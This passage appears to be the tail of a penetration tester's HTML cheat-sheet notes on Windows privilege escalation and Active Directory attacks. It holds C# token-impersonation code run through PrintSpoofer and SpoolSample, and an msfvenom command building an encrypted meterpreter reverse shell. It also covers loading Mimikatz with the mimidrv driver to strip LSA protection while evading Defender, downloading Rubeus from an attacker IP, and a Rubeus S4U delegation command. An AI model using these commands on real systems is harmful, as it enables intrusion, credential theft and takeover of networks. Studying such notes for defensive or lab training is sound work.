{name}.&quot;</span>);<br />            RevertToSelf();<br /><br />            <span style="color:#0088ff;font-weight:400">// Get the system directory</span><br />            StringBuilder sbSystemDir = <span style="color:#ff9d00;font-weight:700">new</span> StringBuilder(<span style="color:#ff0044;font-weight:400">256</span>);<br />            <span style="color:#7f0044;font-weight:400">uint</span> res1 = GetSystemDirectory(sbSystemDir, <span style="color:#ff0044;font-weight:400">256</span>);<br /><br />            <span style="color:#0088ff;font-weight:400">// Spawn a new process with the duplicated token, a desktop session, and the created profile</span><br />            PROCESS_INFORMATION pInfo = <span style="color:#ff9d00;font-weight:700">new</span> PROCESS_INFORMATION();<br />            STARTUPINFO sInfo = <span style="color:#ff9d00;font-weight:700">new</span> STARTUPINFO();<br />            sInfo.cb = Marshal.SizeOf(sInfo);<br />            sInfo.lpDesktop = <span style="color:#3ad900;font-weight:400">&quot;WinSta0\\Default&quot;</span>;<br />            CreateProcessWithTokenW(sysToken, LogonFlags.WithProfile, <span style="color:#ff0044;font-weight:700">null</span>, binToRun, CreationFlags.UnicodeEnvironment, env, sbSystemDir.ToString(), <span style="color:#ff9d00;font-weight:700">ref</span> sInfo, <span style="color:#ff9d00;font-weight:700">out</span> pInfo);<br />            Console.WriteLine($<span style="color:#3ad900;font-weight:400">&quot;Executed &#39;{binToRun}&#39; with impersonated token!&quot;</span>);<br />        }<br />    }<br />}</pre></div></p><p>.\printspoofer.exe \\.\pipe\test\pipe\spoolss &quot;c:\inetpub\wwwroot\upload\rev.exe&quot;</p><p></p><p>c:\inetpub\wwwroot\upload\SharpPrintSpoofer.exe \\.\pipe\test\pipe\spoolss c:\inetpub\wwwroot\upload\rev.exe&quot;</p><p>c:\inetpub\wwwroot\upload\SpoolSample.exe srv01 srv01/pipe/test</p><p>## return to the first session listening </p><p></p><p>sudo msfvenom -p windows/x64/meterpreter/reverse_https LHOST=192.168.45.226 LPORT=443 --encrypt aes --encrypt-key fdgdgj93jf43uj983uf498f43  -f exe -o ./rev.exe</p><p></p><p></p><p>## easier technique <ul><li><h2>meterpreter getsystem</h2></li></ul></p><p></p><p></p><p><h2>Get hash</h2><ul><li>we could load mimikatz from memory Invoke-Mimikatz (as feww times as possible to avoid getting detected)</li><li>we need to disable lsa proctection (mimidrv.sys is not flagged by defender)</li></ul></p><p></p><p><div class="codebox"><pre><span style="color:#0088ff;font-weight:400"># on cmdline </span><br /><span style="color:#0088ff;font-weight:400">##  named &quot;mimidrv&quot;, specify the file path of the driver through binPath=, set its type to &quot;kernel&quot;, and the starting setting to &quot;demand&quot; with start=.</span><br />cmd <span style="color:#ff9d00;font-weight:700">/</span>c <span style="color:#3ad900;font-weight:400">&quot;sc create mimidrv1 binPath=&quot;</span>C<span style="color:#ff9d00;font-weight:700">:\</span>windows<span style="color:#ff9d00;font-weight:700">\</span>tasks<span style="color:#ff9d00;font-weight:700">\</span>mimikatz_dir<span style="color:#ff9d00;font-weight:700">\</span>mimikatz_trunk<span style="color:#ff9d00;font-weight:700">\</span>x64<span style="color:#ff9d00;font-weight:700">\</span>mimidrv.sys<span style="color:#3ad900;font-weight:400">&quot; type= kernel start= demand&quot;</span><br />cmd <span style="color:#ff9d00;font-weight:700">/</span>c <span style="color:#3ad900;font-weight:400">&quot;sc start mimidrv1&quot;</span><br /><span style="color:#0088ff;font-weight:400">## load the driver via starting service </span><br /><span style="color:#ff9d00;font-weight:700">sc</span> <span style="color:#ff9d00;font-weight:700">start</span> mimidrv1<br /><br /><span style="color:#0088ff;font-weight:400">## meterpreter persistence </span><br /><span style="color:#ff9d00;font-weight:700">ps</span> <span style="color:#ff9d00;font-weight:700">-</span>S spoolsV <br />migrate pid <br /><span style="color:#0088ff;font-weight:400">## start delegation atatck </span><br /><span style="color:#0088ff;font-weight:400">$data</span> <span style="color:#ff9d00;font-weight:700">=</span> (<span style="color:#ff9d00;font-weight:700">New-Object</span> System.Net.WebClient).DownloadData(<span style="color:#333333;font-weight:400">&#39;http://192.168.45.228/Rubeus.exe&#39;</span>)<br /></pre></div></p><p></p><p></p><p>.<strong><span style="color:#ff9d00;">\</span></strong>Rubeus.exe <strong><code>s4u /user:web01$ /rc4:12343649cc8ce713962859a2934b8cbb /impersonateuser:administrator /msdsspn:cifs/file01 /ptt</code></strong></p></div>
</body>
</html>
